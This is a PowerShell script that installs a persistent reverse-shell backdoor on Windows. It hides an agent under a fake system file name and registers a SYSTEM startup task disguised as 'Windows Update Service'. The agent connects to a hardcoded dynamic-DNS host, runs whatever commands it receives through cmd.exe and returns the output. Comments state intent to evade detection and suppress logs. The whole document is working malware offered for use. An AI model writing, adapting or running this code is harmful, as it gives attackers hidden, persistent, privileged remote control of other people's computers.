#Install-ReverseTunnel.ps1
#Run as Administrator. Creates scheduled task (SYSTEM) at startup and drops agent to LOCALAPPDATA.
#Uses raw TCP sockets; resolves hostname every attempt (supports dynamic DNS).
#Minimal, uses documented .NET APIs only.

param(
    [string]$ControllerHost = "c2.example.com",  # <-- change to your hostname (use DDNS or VPS hostname)
    [int]$ControllerPort = 4444,
    [string]$InstallDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps",  # plausible location
    [string]$AgentName = "WinNetSvc.ps1",
    [string]$TaskName = "Windows Update Service"
)

# require admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Error "Administrator privileges required. Run elevated."
    exit 1
}

# ensure install dir
if (-not (Test-Path $InstallDir)) { New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null }
$InstallPath = Join-Path $InstallDir $AgentName

# copy self (idempotent)
$src = $MyInvocation.MyCommand.Definition
Copy-Item -Path $src -Destination $InstallPath -Force
    # if running from stdin or otherwise, write minimal agent below to path
    $agentContent = @'

$TARGET_HOST = "kdshost.duckdns.org"  # Replace with actual host IP
$PORT = 4444

function Execute-Command {
    param($cmd)
    try {
        # Use cmd.exe directly to bypass PowerShell restrictions
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo.FileName = "C:\Windows\System32\cmd.exe"
        $process.StartInfo.Arguments = "/c `"$cmd`""
        $process.StartInfo.UseShellExecute = $false
        $process.StartInfo.RedirectStandardOutput = $true
        $process.StartInfo.RedirectStandardError = $true
        
        $process.Start()
        $output = $process.StandardOutput.ReadToEnd()
        $error = $process.StandardError.ReadToEnd()
        $process.WaitForExit()
        
        return $output + $error
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

# Main tunnel loop
try {
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $connectAsync = $tcpClient.BeginConnect($TARGET_HOST, $PORT, $null, $null)
    
    #wait up to 10 seconds for connection
    if (!$connectAsync.AsyncWaitHandle.WaitOne(10000)) {
        throw "Connection timeout"
    }
    
    $tcpClient.EndConnect($connectAsync)
    
    #set high priority for stability
    [System.Diagnostics.Process]::GetCurrentProcess().PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
    $stream = $tcpClient.GetStream()
    
    #keep-alive mechanism
    $lastActivity = [DateTime]::Now
    while ($true) {
        try {
            # Check for inactivity (prevent hanging)
            if (([DateTime]::Now - $lastActivity).TotalSeconds -gt 30) {
                break
            }
            
            $buffer = New-Object byte[] 1024
            $count = $stream.Read($buffer, 0, $buffer.Length)
            
            if ($count -gt 0) {
                $command = [Text.Encoding]::UTF8.GetString($buffer[0..($count-1)])
                $lastActivity = [DateTime]::Now
                
                # Process command with proper error handling
                $response = Execute-Command -cmd $command
                
                # Send response with proper encoding
                $bytes = [Text.Encoding]::UTF8.GetBytes($response)
                $stream.Write($bytes, 0, $bytes.Length)
            }
        } catch {
            continue  #Continue despite errors
        }
    }
} catch {
    #no error output to avoid detection
} finally {
    if ($stream) { $stream.Close() }
    if ($tcpClient) { $tcpClient.Close() }
}
'@
    Set-Content -Path $InstallPath -Value $agentContent -Encoding UTF8 -Force

#register scheduled task to run the agent at startup as SYSTEM
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`" -ControllerHost `"$ControllerHost`" -ControllerPort $ControllerPort"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
try {
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -Quiet
} catch {
    # No Logs
}
Start-Job -ScriptBlock { 
    & powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$using:InstallPath" -ControllerHost "$using:ControllerHost" -ControllerPort $using:ControllerPort 
} | Out-Null
